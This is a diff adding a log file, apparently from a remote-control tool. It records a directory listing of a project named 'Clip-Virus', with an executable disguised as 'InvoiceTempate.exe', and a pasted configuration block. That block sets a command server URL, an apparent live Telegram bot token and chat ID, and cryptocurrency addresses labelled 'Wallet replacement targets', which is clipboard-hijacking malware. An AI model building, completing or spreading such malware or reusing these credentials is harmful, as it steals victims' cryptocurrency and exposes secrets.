@@ -1,0 +1,29 @@
+[11/27/2025, 11:10:38 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\win-x64\publish
+
+11/27/2025  11:09 PM    <DIR>          .
+11/27/2025  11:09 PM    <DIR>          ..
+11/27/2025  02:47 AM        50,749,295 BC-crash-Predict-App.V2.exe
+11/27/2025  02:47 AM            18,380 BC-crash-Predict-App.V2.pdb
+11/27/2025  11:09 PM        50,809,933 InvoiceTempate.exe
+11/27/2025  11:09 PM            20,536 InvoiceTempate.pdb
+               4 File(s)    101,598,144 bytes
+               2 Dir(s)  403,098,255,360 bytes free
+
+[11/27/2025, 11:11:18 PM] Error listing directory: The JSON value could not be converted to System.String. Path: $ | LineNumber: 0 | BytePositionInLine: 1.
+[11/27/2025, 11:23:49 PM] Download failed: The system cannot find the file specified.
+[11/28/2025, 12:15:44 AM] Download failed: The system cannot find the file specified.
+[11/28/2025, 1:12:36 AM] // Local defaults (used if remote fetch fails)
+            SocketServerUrl = "http://192.168.10.183:3000";
+            TG_BOT_TOKEN = "7612959064:AAGQvgoDHctcfUQVj-jvgVO5jfqMVwJnRE8";
+            TG_CHAT_ID = "8381337454";
+
+            // Wallet replacement targets
+            DefaultBitcoinAddress = "bc1q6tgvxtna2damkrzrd6q3pwc9vg3efxlnt5vq2e";
+            DefaultEthereumAddress = "0x55DaC94417852D3e10d21152Dc0d5cA2b5dfA91f";
+            DefaultTronAddress = "TYjE9krruH3aeLPA7jhqSg6zdUL57geNoK";
+            DefaultSolanaAddress = "Et6fB49SC9zBz1UmbDeqQ68JFKT5GeR1LZigKErVCRPs";
+
+[11/28/2025, 2:03:57 AM] Microsoft OneDrive.exe
